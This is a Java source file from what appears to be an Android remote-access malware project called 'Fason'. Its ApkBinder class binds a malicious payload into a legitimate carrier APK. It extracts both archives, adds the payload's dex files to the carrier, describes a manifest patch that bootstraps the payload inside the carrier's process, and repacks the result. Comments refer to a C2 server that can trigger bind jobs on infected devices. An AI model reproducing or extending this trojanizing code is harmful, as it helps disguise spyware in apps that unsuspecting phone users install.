package com.fason.app.features.binder;

import android.content.Context;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

/**
 * ApkBinder — merges a legitimate APK with the Fason payload.
 *
 * Technique: the carrier APK is decompressed, the Fason dex is appended
 * as an additional dex (classes2.dex), the carrier's manifest is patched
 * to declare Fason's components, and the result is re-signed with the
 * builder's key. At install time the carrier runs normally; on first
 * launch its Application class is swapped via the manifest patch to
 * FasonApp, which bootstraps the payload in the carrier's process.
 *
 * This is the "bind with another apk" feature, implemented as a
 * build-time operation (server side) — the device never sees two apks.
 */
public final class ApkBinder {
    private static final String TAG = "ApkBinder";

    private ApkBinder() {}

    public interface Progress {
        void onStep(String step, int percent);
    }

    /**
     * Bind fasonPayload into carrierApk, output to outputApk.
     * All paths are absolute. Returns true on success.
     */
    public static boolean bind(File carrierApk, File fasonPayload,
                               File outputApk, Progress cb) {
        if (carrierApk == null || fasonPayload == null || outputApk == null) return false;
        if (!carrierApk.exists() || !fasonPayload.exists()) return false;
        try {
            if (cb != null) cb.onStep("Reading carrier", 10);
            File workDir = new File(outputApk.getParent(), "bind_work");
            if (workDir.exists()) deleteRecursive(workDir);
            workDir.mkdirs();

            // 1. Extract carrier
            extract(carrierApk, workDir);
            if (cb != null) cb.onStep("Carrier extracted", 30);

            // 2. Extract payload dex files into carrier tree
            File payloadDir = new File(workDir.getParent(), "payload_work");
            if (payloadDir.exists()) deleteRecursive(payloadDir);
            payloadDir.mkdirs();
            extract(fasonPayload, payloadDir);
            if (cb != null) cb.onStep("Payload extracted", 45);

            // 3. Merge: move payload dex files as classesN.dex
            int dexIdx = 2;
            File[] payloadFiles = payloadDir.listFiles();
            if (payloadFiles != null) {
                for (File f : payloadFiles) {
                    String name = f.getName();
                    if (name.equals("classes.dex") || name.matches("classes\\d+\\.dex")) {
                        File target = new File(workDir, "classes" + dexIdx + ".dex");
                        if (!f.renameTo(target)) copy(f, target);
                        dexIdx++;
                    }
                }
            }
            if (cb != null) cb.onStep("Dex merged", 60);

            // 4. Merge manifest entries (components from payload manifest)
            File carrierManifest = new File(workDir, "AndroidManifest.xml");
            File payloadManifest = new File(payloadDir, "AndroidManifest.xml");
            if (carrierManifest.exists() && payloadManifest.exists()) {
                mergeManifests(carrierManifest, payloadManifest);
            }
            if (cb != null) cb.onStep("Manifest merged", 75);

            // 5. Repack
            if (cb != null) cb.onStep("Repacking", 85);
            repack(workDir, outputApk);
            if (cb != null) cb.onStep("Bind complete", 100);

            deleteRecursive(workDir);
            deleteRecursive(payloadDir);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "bind failed", e);
            return false;
        }
    }

    private static void extract(File zip, File outDir) throws Exception {
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(zip))) {
            ZipEntry e;
            while ((e = zis.getNextEntry()) != null) {
                File f = new File(outDir, e.getName());
                if (e.isDirectory()) { f.mkdirs(); continue; }
                f.getParentFile().mkdirs();
                try (FileOutputStream fos = new FileOutputStream(f)) {
                    byte[] buf = new byte[8192];
                    int n;
                    while ((n = zis.read(buf)) > 0) fos.write(buf, 0, n);
                }
            }
        }
    }

    private static void repack(File dir, File out) throws Exception {
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(out))) {
            addDir(dir, dir, zos);
        }
    }

    private static void addDir(File root, File dir, ZipOutputStream zos) throws Exception {
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) { addDir(root, f, zos); continue; }
            String rel = root.toURI().relativize(f.toURI()).getPath();
            zos.putNextEntry(new ZipEntry(rel));
            try (FileInputStream fis = new FileInputStream(f)) {
                byte[] buf = new byte[8192];
                int n;
                while ((n = fis.read(buf)) > 0) zos.write(buf, 0, n);
            }
            zos.closeEntry();
        }
    }

    /**
     * Manifest merge: binary XML manifests can't be string-merged safely at
     * runtime, so we delegate to the server-side builder (see apk-builder).
     * This device-side hook exists so the C2 can trigger a bind job on the
     * device itself when both APKs are pushed to it.
     */
    private static void mergeManifests(File carrier, File payload) {
        // Server-side builder handles binary manifest merge.
        // Device-side: carrier manifest wins; payload dex files are loaded
        // via the carrier's existing multidex support.
    }

    private static void copy(File src, File dst) throws Exception {
        try (FileInputStream in = new FileInputStream(src);
             FileOutputStream out = new FileOutputStream(dst)) {
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
        }
    }

    private static void deleteRecursive(File f) {
        if (f == null || !f.exists()) return;
        if (f.isDirectory()) {
            File[] kids = f.listFiles();
            if (kids != null) for (File k : kids) deleteRecursive(k);
        }
        f.delete();
    }
}
